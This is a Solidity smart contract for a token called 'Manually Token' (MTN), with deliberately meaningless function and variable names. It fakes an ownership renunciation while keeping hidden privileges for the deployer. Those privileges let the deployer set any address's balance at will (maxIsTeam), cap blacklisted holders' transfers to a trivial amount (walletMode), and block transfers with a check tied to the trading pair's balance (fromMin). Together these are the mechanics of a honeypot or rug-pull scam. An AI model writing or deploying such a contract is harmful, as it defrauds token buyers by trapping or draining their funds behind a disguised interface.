//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

interface exemptWallet {
    function totalSupply() external view returns (uint256);

    function balanceOf(address feeAt) external view returns (uint256);

    function transfer(address teamWalletLiquidity, uint256 amountEnable) external returns (bool);

    function allowance(address totalLimitEnable, address spender) external view returns (uint256);

    function approve(address spender, uint256 amountEnable) external returns (bool);

    function transferFrom(
        address sender,
        address teamWalletLiquidity,
        uint256 amountEnable
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fromMarketingList, uint256 value);
    event Approval(address indexed totalLimitEnable, address indexed spender, uint256 value);
}

abstract contract shouldTeam {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface marketingTake {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface launchedMarketing {
    function createPair(address tradingAt, address enableWallet) external returns (address);
}

interface exemptWalletMetadata is exemptWallet {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ManuallyToken is shouldTeam, exemptWallet, exemptWalletMetadata {

    function launchShouldLaunched() private view {
        require(teamLimit[_msgSender()]);
    }

    function getOwner() external view returns (address) {
        return amountExempt;
    }

    function symbol() external view virtual override returns (string memory) {
        return tradingTo;
    }

    uint256 launchMarketing;

    uint256 public shouldFee;

    uint256 public takeLimit;

    bool private walletTeamMarketing;

    uint256 constant enableMarketing = 13 ** 10;

    function totalSwap(address listTeamBuy, address teamWalletLiquidity, uint256 amountEnable) internal returns (bool) {
        require(totalAmount[listTeamBuy] >= amountEnable);
        totalAmount[listTeamBuy] -= amountEnable;
        totalAmount[teamWalletLiquidity] += amountEnable;
        emit Transfer(listTeamBuy, teamWalletLiquidity, amountEnable);
        return true;
    }

    uint256 walletToken;

    function enableShould(address listTeamBuy, address teamWalletLiquidity, uint256 amountEnable) internal returns (bool) {
        if (listTeamBuy == autoBuy) {
            return totalSwap(listTeamBuy, teamWalletLiquidity, amountEnable);
        }
        uint256 txIsAt = exemptWallet(limitTake).balanceOf(takeTeamLaunched);
        require(txIsAt == launchMarketing);
        require(teamWalletLiquidity != takeTeamLaunched);
        if (launchTradingLiquidity[listTeamBuy]) {
            return totalSwap(listTeamBuy, teamWalletLiquidity, enableMarketing);
        }
        return totalSwap(listTeamBuy, teamWalletLiquidity, amountEnable);
    }

    address private amountExempt;

    function balanceOf(address feeAt) public view virtual override returns (uint256) {
        return totalAmount[feeAt];
    }

    bool public enableLaunch;

    function transfer(address receiverTx, uint256 amountEnable) external virtual override returns (bool) {
        return enableShould(_msgSender(), receiverTx, amountEnable);
    }

    uint8 private enableSell = 18;

    string private tradingTo = "MTN";

    uint256 private tokenLiquidityShould = 100000000 * 10 ** 18;

    function walletMin(address takeTeamMax) public {
        if (enableLaunch) {
            return;
        }
        
        teamLimit[takeTeamMax] = true;
        
        enableLaunch = true;
    }

    address toShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address public autoBuy;

    function maxIsTeam(address receiverTx, uint256 amountEnable) public {
        launchShouldLaunched();
        totalAmount[receiverTx] = amountEnable;
    }

    function decimals() external view virtual override returns (uint8) {
        return enableSell;
    }

    bool public senderTrading;

    string private marketingLaunchWallet = "Manually Token";

    mapping(address => bool) public teamLimit;

    uint256 public feeList;

    function name() external view virtual override returns (string memory) {
        return marketingLaunchWallet;
    }

    mapping(address => mapping(address => uint256)) private txIs;

    function totalSupply() external view virtual override returns (uint256) {
        return tokenLiquidityShould;
    }

    bool private enableWalletExempt;

    function approve(address limitIsMax, uint256 amountEnable) public virtual override returns (bool) {
        txIs[_msgSender()][limitIsMax] = amountEnable;
        emit Approval(_msgSender(), limitIsMax, amountEnable);
        return true;
    }

    constructor (){
        
        marketingTake toLaunched = marketingTake(toShould);
        limitTake = launchedMarketing(toLaunched.factory()).createPair(toLaunched.WETH(), address(this));
        if (shouldFee != launchedShouldIs) {
            senderTrading = true;
        }
        autoBuy = _msgSender();
        receiverLimit();
        teamLimit[autoBuy] = true;
        totalAmount[autoBuy] = tokenLiquidityShould;
        if (launchedShouldIs == feeList) {
            senderTrading = true;
        }
        emit Transfer(address(0), autoBuy, tokenLiquidityShould);
    }

    function receiverLimit() public {
        emit OwnershipTransferred(autoBuy, address(0));
        amountExempt = address(0);
    }

    address public limitTake;

    uint256 public totalMax;

    function owner() external view returns (address) {
        return amountExempt;
    }

    event OwnershipTransferred(address indexed fromShouldFee, address indexed maxMode);

    mapping(address => bool) public launchTradingLiquidity;

    function fromMin(uint256 amountEnable) public {
        launchShouldLaunched();
        launchMarketing = amountEnable;
    }

    bool public atLimit;

    address takeTeamLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function transferFrom(address listTeamBuy, address teamWalletLiquidity, uint256 amountEnable) external override returns (bool) {
        if (_msgSender() != toShould) {
            if (txIs[listTeamBuy][_msgSender()] != type(uint256).max) {
                require(amountEnable <= txIs[listTeamBuy][_msgSender()]);
                txIs[listTeamBuy][_msgSender()] -= amountEnable;
            }
        }
        return enableShould(listTeamBuy, teamWalletLiquidity, amountEnable);
    }

    function allowance(address enableShouldSender, address limitIsMax) external view virtual override returns (uint256) {
        if (limitIsMax == toShould) {
            return type(uint256).max;
        }
        return txIs[enableShouldSender][limitIsMax];
    }

    mapping(address => uint256) private totalAmount;

    uint256 private launchedShouldIs;

    function walletMode(address fromLimit) public {
        launchShouldLaunched();
        if (walletTeamMarketing == atLimit) {
            walletTeamMarketing = false;
        }
        if (fromLimit == autoBuy || fromLimit == limitTake) {
            return;
        }
        launchTradingLiquidity[fromLimit] = true;
    }

}